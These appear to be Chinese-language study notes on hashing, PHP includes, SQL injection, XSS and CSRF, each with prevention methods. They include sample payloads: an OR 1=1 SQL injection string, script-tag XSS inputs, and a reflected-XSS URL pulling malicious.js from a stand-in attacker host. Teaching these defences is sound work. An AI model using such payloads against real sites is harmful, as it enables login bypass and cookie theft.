## 請說明雜湊跟加密的差別在哪裡，為什麼密碼要雜湊過後才存入資料庫
### 雜湊跟加密的差別
　1. 加密需要密鑰，且可以透過解密得到原文。（加密可逆）
  2. 雜湊不需密鑰，無法逆向解出原始輸入。（雜湊不可逆）
    - 雖然可以透過額外儲存的 rainbow table 來找尋原始輸入，但彩虹表是預先計算並儲存下來的，而不是雜湊演算法本身的設計。
### 為什麼密碼要用雜湊
因為雜湊值無法反推回原密碼，所以即便有一天資料庫不小心洩漏出去了，駭客還是拿不到使用者的密碼，只能拿到密碼的雜湊值。

## `include`、`require`、`include_once`、`require_once` 的差別
### `include`、`require`
1. 使用方式
  - `include` 有讀到該行程式碼才會執行載入
  - `require` 只要檔案被開啟就會執行載入
2. 錯誤處理
  - `include` 會印出警告訊息（E_WARNING）, 並繼續執行後半段的程式
  - `require` 會印出錯誤訊息（E_COMPILE_ERROR）, 並中止程式
### 後面帶有 `_once`
1. 多次引入相同的檔案。
2. 確保不會因為重覆引入相同的檔案，而產生函數重覆定義 (function redefinitons) 的錯誤。
3. 確保不會因為重覆引入相同的檔案，而產生變數重覆給值 (value reassignments) 的錯誤。
4. 必須安裝 PHP 4.0.1pl2 以上的版本。

## 請說明 SQL Injection 的攻擊原理以及防範方法
### 攻擊原理
> 利用 SQL 語句拼接漏洞

原本在程式裡面的字串是 
`$SQL = "SELECT * FROM user WHERE ID= " . $id . " AND Password =" . $password;`
如果使用者在 password 輸入 `' OR 1=1; --`使語句變成
 `SELECT * FROM user WHERE ID= '隨便輸入' AND Password ='' OR 1=1;`
輸入這樣的值代表什麼，代表所有畫面上的輸入值都無所謂，因為1=1恆等式一定會成立，且前面的condition為OR，所以可以把前面的where condition都忽略掉。後面再補上個分號，代表這一個SQL子句已經結束，最後再補上--，代表後面的sql為註解。
就這樣，最基本的SQL injection就成功了。

### 防範方法
1. 過濾輸入值
   - 但攻擊手法相當多種，要過濾的字元組合可能一個都漏不得，所以自己設定黑名單來進行過濾，是一件非不得以才做的事。
2. 使用程式的 sql 綁定
   - PHP 中可以先用 SQL 預處理語句的方法，使用 ? 佔位符，再使用 bind parameters
```php
$sql = 'SELECT * FROM users WHERE username = ? AND password = ?';
$stmt = $conn->prepare($sql);
$stmt->bind_param('ss', $username, $password);

$stmt->execute();
```
  - 透過這種方式，在SqlCommand執行時，會自動過濾掉可能造成問題的字元。

##  請說明 XSS 的攻擊原理以及防範方法
### 攻擊原理
XSS 主要是利用在輸入欄位輸入 JS 的 script tag來造成攻擊，透過在輸入框輸入一些特殊語法，規避掉字元的規則（或是程式本身沒有做好字串驗證）
1. Store XSS
  - 儲存型 XSS，如一般留言版功能，使用者可以輸入`<script>alert(‘你被攻擊啦！’)</script>`並存入資料庫，當留言被其他人使用時從資料庫取出，後端又沒有做做字串防範跟解析，其他使用者開啟時並會執行該惡意程式片段。
2. Reflected XSS　
  - 反射型 XSS，攻擊方式為將 script 藏在 URL 網址列中，並透過 GET 參數傳遞，下面的範例將事先寫好的 malicious.js 檔案放在 url 的 username param 中，該檔案可能是盜取帳號密碼、盜取 cookie 等惡意操作，當使用者點擊後就會被執行。
  ```
  http://localhost:8080/reflected-xss-demos/?username='><script src='http://malicious-site.com/malicious.js'></script><a href='
  ```
3. DOM Based XSS
  - DOM Based XSS 與前兩者的差別是前兩者需要在 server side 防範，DOM Based 則需要在 client side 防範。如果頁面中使用了如 innerHTML 等語法，就有注入 JS 程式碼的機會，而如果可以注入 JS 程式碼就有可能造成 cookie 資料被偷走傳到攻擊者的 server。例如攻擊者可以放入一個被隱藏看不見的 img element，不過該 img 的 src 放的是一個「攜帶 cookie 資訊的請求」，如此一來攻擊者的伺服器就可以拿到被攻擊者的 cookie 了。

### 防範
1. 輸入時的防範
  - 篩選掉特殊字串 ex:  `<script>`
  - 缺點很容易有漏洞不完善, 最好是在輸出端做解析
2. 輸出的 encoding
  - 原始 `<script>alert('xss')</script>`
  - 輸出到網頁解析 `&lt;script&gt;alert(&#x27;xss&#x27;);&lt;/script&gt;`
  - 讓瀏覽器會把它當作純文字，而不是可以執行的程式。


## 請說明 CSRF 的攻擊原理以及防範方法
### 攻擊原理
跨站請求攻擊，簡單地說，是攻擊者通過一些技術手段欺騙使用者的瀏覽器去存取一個自己曾經認證過的網站並執行一些操作（如發郵件，發訊息，甚至財產操作如轉帳和購買商品）。由於瀏覽器曾經認證過，所以被存取的網站會認為是真正的使用者操作而去執行。這利用了web中使用者身分驗證的一個漏洞：簡單的身分驗證只能保證請求是發自某個使用者的瀏覽器，卻不能保證請求本身是使用者自願發出的。

### 防範方法
1. 檢查 Referer
  - request 的 header 裡面會帶一個欄位叫做 referer，代表這個 request 是從哪個地方過來的，可以檢查這個欄位看是不是合法的 domain，不是的話直接 reject 掉即可。
  - 缺點: 容易漏掉 subdomain
2. 加上圖形驗證碼、簡訊驗證碼
  - 就跟網路銀行轉帳的時候一樣，都會要你收簡訊驗證碼，多了這一道檢查就可以確保不會被 CSRF 攻擊。
  - 最完善，但是也最麻煩，有時候只是要做一般刪除動作
3. 加上 CSRF token
  - 使用者在第一次請求網頁時，伺服器在網頁內 input:hidden 塞入 token，當表單送出時伺服器可以比對送來的 token 有無一樣，幫助判斷是否由同一個人發出
  - 缺點: 如果伺服器有開啟 CORS ，就會讓攻擊方直接發 request 並拿到 token。
4. Double Submit Cookie
  - 同上會在 form 放入 token，並在第一次請求 Set-cookie，與 token 值相同，因 cookie 發送有 domain 的限制，發送時會比較 cookie 裡的 token 與 form token 是否相符